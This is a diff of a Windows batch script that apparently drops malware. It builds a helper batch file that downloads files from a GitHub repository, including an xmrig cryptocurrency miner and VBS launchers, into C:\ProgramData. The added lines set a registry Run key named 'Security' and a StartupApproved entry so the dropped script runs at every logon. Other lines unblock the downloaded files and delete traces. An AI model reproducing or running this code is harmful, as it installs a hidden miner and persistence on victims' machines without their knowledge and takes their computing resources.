@@ -45,7 +45,9 @@ echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/smb.tx
 echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs">> "C:\ProgramData\word.bat"
 echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe">> "C:\ProgramData\word.bat"
 echo timeout 0>> "C:\ProgramData\word.bat"
-echo start "" "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
+echo REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\start.vbs">> "C:\ProgramData\word.bat"
+echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F>> "C:\ProgramData\word.bat"
+echo start "" "C:\ProgramData\start.vbs">> "C:\ProgramData\word.bat"
 echo timeout 1>> "C:\ProgramData\word.bat"
 echo del "C:\ProgramData\word.bat">> "C:\ProgramData\word.bat"
 echo del "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
@@ -69,6 +71,7 @@ powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*" >> nul
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs" >> nul
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F>> "C:\ProgramData\word.bat"
 start "" "C:\ProgramData\world.vbs" >> nul
 timeout 0 >> nul
 exit >> nul
